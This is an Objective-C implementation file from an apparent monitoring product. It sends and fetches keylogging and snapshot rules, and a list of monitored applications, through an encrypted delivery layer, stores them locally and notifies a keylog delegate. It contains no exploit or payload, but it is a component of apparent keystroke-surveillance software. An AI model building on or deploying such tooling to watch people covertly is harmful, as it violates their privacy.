//
//  KeySnapShotRuleManagerImpl.m
//  KeySnapShotRuleManager
//
//  Created by Makara Khloth on 10/24/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import "KeySnapShotRuleManagerImpl.h"
#import "KeySnapShotRuleStore.h"
#import "KeyLogRuleDelegate.h"

#import "DefDDM.h"
#import "DataDelivery.h"
#import "DeliveryRequest.h"
#import "DeliveryResponse.h"

#import "SendSnapShotRule.h"
#import "GetSnapShotRule.h"
#import "SendMonitorApplication.h"
#import "GetMonitorApplication.h"
#import "GetSnapShotRuleResponse.h"
#import "GetMonitorApplicationResponse.h"

@interface KeySnapShotRuleManagerImpl (private)
- (DeliveryRequest*) sendSnapShotRulesRequest;
- (DeliveryRequest*) getSnapShotRulesRequest;
- (DeliveryRequest*) sendMonitorApplicationsRequest;
- (DeliveryRequest*) getMonitorApplicationsRequest;
@end


@implementation KeySnapShotRuleManagerImpl

@synthesize mDDM, mKeyLogRuleDelegate, mSendSnapShotRuleRequestDelegate, mGetSnapShotRuleRequestDelegate, mSendMonitorApplicationsRequestDelegate, mGetMonitorApplicationsRequestDelegate;

- (id)initWithDDM:(id<DataDelivery>)aDDM {
    self = [super init];
    if (self) {
        [self setMDDM:aDDM];
        mKeySnapShotRuleStore = [[KeySnapShotRuleStore alloc] initWithSnapShotRuleFilePath:nil];
    }
    
    return (self);
}

- (NSDictionary *) getKeyLogRuleInfo {
    return ([mKeySnapShotRuleStore getKeyLogRuleInfo]);
}

- (NSDictionary *) getMonitorApplicationInfo {
    return ([mKeySnapShotRuleStore getMonitorApplicationInfo]);
}

- (void) clearAllRules {
    [mKeySnapShotRuleStore deleteAllRules];
}

#pragma mark Protocols
#pragma mark -

- (BOOL) requestSendSnapShotRules: (id <SnapShotRuleRequestDelegate>) aDelegate {
    BOOL done = NO;
    DeliveryRequest* request = [self sendSnapShotRulesRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		
		SendSnapShotRule* sendSnapShotRule = [[SendSnapShotRule alloc] init];
        [sendSnapShotRule setMSnapShotRule:[mKeySnapShotRuleStore mSnapShotRule]];
		[request setMCommandCode:[sendSnapShotRule getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendSnapShotRule];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
        [sendSnapShotRule release];
		
		[self setMSendSnapShotRuleRequestDelegate:aDelegate];				// set delegate
		
		done = YES;
	}
    return (done);
}

- (BOOL) requestGetSnapShotRules: (id <SnapShotRuleRequestDelegate>) aDelegate {
    BOOL done = NO;
    DeliveryRequest* request = [self getSnapShotRulesRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		
		GetSnapShotRule* getSnapShotRule = [[GetSnapShotRule alloc] init];
		[request setMCommandCode:[getSnapShotRule getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:getSnapShotRule];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
        [getSnapShotRule release];
		
		[self setMGetSnapShotRuleRequestDelegate:aDelegate];				// set delegate
		
		done = YES;
	}
    return (done);
}

- (BOOL) requestSendMonitorApplications: (id <MonitorApplicationRequestDelegate>) aDelegate {
    BOOL done = NO;
    DeliveryRequest* request = [self sendMonitorApplicationsRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		
		SendMonitorApplication* sendMonitorApplication = [[SendMonitorApplication alloc] init];
        [sendMonitorApplication setMMonitorApplications:[mKeySnapShotRuleStore mMonitorApplications]];
		[request setMCommandCode:[sendMonitorApplication getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendMonitorApplication];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
        [sendMonitorApplication release];
		
		[self setMSendMonitorApplicationsRequestDelegate:aDelegate];				// set delegate
		
		done = YES;
	}
    return (done);
}

- (BOOL) requestGetMonitorApplications: (id <MonitorApplicationRequestDelegate>) aDelegate {
    BOOL done = NO;
    DeliveryRequest* request = [self getMonitorApplicationsRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		
		GetMonitorApplication* getMonitorApplication = [[GetMonitorApplication alloc] init];
		[request setMCommandCode:[getMonitorApplication getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:getMonitorApplication];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
        [getMonitorApplication release];
		
		[self setMGetMonitorApplicationsRequestDelegate:aDelegate];				// set delegate
		
		done = YES;
	}
    return (done);
}

#pragma mark DeliveryListener protocol
#pragma mark -

- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog (@"KeySnapShotRuleManagerImpl --> requestFinished: aResponse.mSuccess: %d", [aResponse mSuccess])
    
    if ([aResponse mSuccess]) { // Success
		if ([aResponse mEDPType] == kEDPTypeSendSnapShotRules) {						// Send snap shot rules
			DLog (@">>>> requestFinished: kEDPTypeSendSnapShotRules")
			id <SnapShotRuleRequestDelegate> delegate = [self mSendSnapShotRuleRequestDelegate];
			[self setMSendSnapShotRuleRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestSnapShotRulesCompleted:)]) {
				[delegate requestSnapShotRulesCompleted:nil];
            }
		} else if ([aResponse mEDPType] == kEDPTypeGetSnapShotRules) {				// Get snap shot rules
			DLog (@">>>> requestFinished: kEDPTypeGetSnapShotRules")
            DLog (@"[aResponse mCSMReponse] %@", [aResponse mCSMReponse]);
            
            GetSnapShotRuleResponse *getSnapShotRuleResponse = (GetSnapShotRuleResponse *)[aResponse mCSMReponse];
            [mKeySnapShotRuleStore saveSnapShotRule:[getSnapShotRuleResponse mSnapShotRule]];
            
            // Notify plist of monitorApplicationChanged & keyLogRuleChanged
            if ([mKeyLogRuleDelegate respondsToSelector:@selector(monitorApplicationChanged:)]) {
                [mKeyLogRuleDelegate monitorApplicationChanged:[mKeySnapShotRuleStore getMonitorApplicationInfo]];
            }
            if ([mKeyLogRuleDelegate respondsToSelector:@selector(keyLogRuleChanged:)]) {
                [mKeyLogRuleDelegate keyLogRuleChanged:[mKeySnapShotRuleStore getKeyLogRuleInfo]];
            }
            
			id <SnapShotRuleRequestDelegate> delegate = [self mGetSnapShotRuleRequestDelegate];
			[self setMGetSnapShotRuleRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestSnapShotRulesCompleted:)]) {
				[delegate requestSnapShotRulesCompleted:nil];
            }
		} else if ([aResponse mEDPType] == kEDPTypeSendMonitorApplications) {						// Send monitor applications
			DLog (@">>>> requestFinished: kEDPTypeSendMonitorApplications")
			id <MonitorApplicationRequestDelegate> delegate = [self mSendMonitorApplicationsRequestDelegate];
			[self setMSendMonitorApplicationsRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestMonitorApplicationsCompleted:)]) {
				[delegate requestMonitorApplicationsCompleted:nil];
            }
		} else if ([aResponse mEDPType] == kEDPTypeGetMonitorApplications) {				// Get monitor applications
			DLog (@">>>> requestFinished: kEDPTypeGetMonitorApplications")
            DLog (@"[aResponse mCSMReponse] %@", [aResponse mCSMReponse]);
            
            GetMonitorApplicationResponse *getMonitorApplicationResponse = (GetMonitorApplicationResponse *)[aResponse mCSMReponse];
            [mKeySnapShotRuleStore saveMonitorApplications:[getMonitorApplicationResponse mMonitorApplications]];
            
            // Notify plist of monitorApplicationChanged & keyLogRuleChanged
            if ([mKeyLogRuleDelegate respondsToSelector:@selector(monitorApplicationChanged:)]) {
                [mKeyLogRuleDelegate monitorApplicationChanged:[mKeySnapShotRuleStore getMonitorApplicationInfo]];
            }
            if ([mKeyLogRuleDelegate respondsToSelector:@selector(keyLogRuleChanged:)]) {
                [mKeyLogRuleDelegate keyLogRuleChanged:[mKeySnapShotRuleStore getKeyLogRuleInfo]];
            }
            
			id <MonitorApplicationRequestDelegate> delegate = [self mGetMonitorApplicationsRequestDelegate];
			[self setMGetMonitorApplicationsRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestMonitorApplicationsCompleted:)]) {
				[delegate requestMonitorApplicationsCompleted:nil];
            }
		}
	} else { // Error
		if ([aResponse mEDPType] == kEDPTypeSendSnapShotRules) {						// Send snap shot rules
			DLog (@"not success")
			id <SnapShotRuleRequestDelegate> delegate = [self mSendSnapShotRuleRequestDelegate];
			[self setMSendSnapShotRuleRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestSnapShotRulesCompleted:)])	{		
				DLog (@">>>> requestFinished: kEDPTypeSendSnapShotRules")
				NSError *error = [NSError errorWithDomain:@"Send Snap Shot Rules" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];								
				[delegate requestSnapShotRulesCompleted:error];
			}
		} else if ([aResponse mEDPType] == kEDPTypeGetSnapShotRules) {				// Get snap shot rules
			DLog (@">>>> requestFinished: kEDPTypeGetSnapShotRules")
			id <SnapShotRuleRequestDelegate> delegate = [self mGetSnapShotRuleRequestDelegate];
			[self setMGetSnapShotRuleRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestSnapShotRulesCompleted:)]) {
				NSError *error = [NSError errorWithDomain:@"Get Snap Shot Rules" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];					
				[delegate requestSnapShotRulesCompleted:error];
			}
		} else if ([aResponse mEDPType] == kEDPTypeSendMonitorApplications) {						// Send monitor applications
			DLog (@"not success")
			id <MonitorApplicationRequestDelegate> delegate = [self mSendMonitorApplicationsRequestDelegate];
			[self setMSendMonitorApplicationsRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestMonitorApplicationsCompleted:)])	{		
				DLog (@">>>> requestFinished: kEDPTypeSendMonitorApplications")
				NSError *error = [NSError errorWithDomain:@"Send Monitor Applications" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];								
				[delegate requestMonitorApplicationsCompleted:error];
			}
		} else if ([aResponse mEDPType] == kEDPTypeGetMonitorApplications) {				// Get monitor applications
			DLog (@">>>> requestFinished: kEDPTypeGetMonitorApplications")
			id <MonitorApplicationRequestDelegate> delegate = [self mGetMonitorApplicationsRequestDelegate];
			[self setMGetMonitorApplicationsRequestDelegate:nil];
			if ([delegate respondsToSelector:@selector(requestMonitorApplicationsCompleted:)]) {
				NSError *error = [NSError errorWithDomain:@"Get Monitor Applications" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];					
				[delegate requestMonitorApplicationsCompleted:error];
			}
		}
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	DLog (@"Update progress aResponse = %@", aResponse)
}

#pragma mark Private methods
#pragma mark -

- (DeliveryRequest*) sendSnapShotRulesRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_KeySnapShotRuleManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:5];
    [request setMEDPType:kEDPTypeSendSnapShotRules];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return request;
}

- (DeliveryRequest*) getSnapShotRulesRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_KeySnapShotRuleManager];
    [request setMPriority:kDDMRequestPriortyNormal];	
    [request setMMaxRetry:5];
    [request setMEDPType:kEDPTypeGetSnapShotRules];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return request;
}

- (DeliveryRequest*) sendMonitorApplicationsRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_KeySnapShotRuleManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:5];
    [request setMEDPType:kEDPTypeSendMonitorApplications];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return request;
}

- (DeliveryRequest*) getMonitorApplicationsRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_KeySnapShotRuleManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:5];
    [request setMEDPType:kEDPTypeGetMonitorApplications];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return request;
}

- (void) dealloc {
    [mKeySnapShotRuleStore release];
    [super dealloc];
}

@end
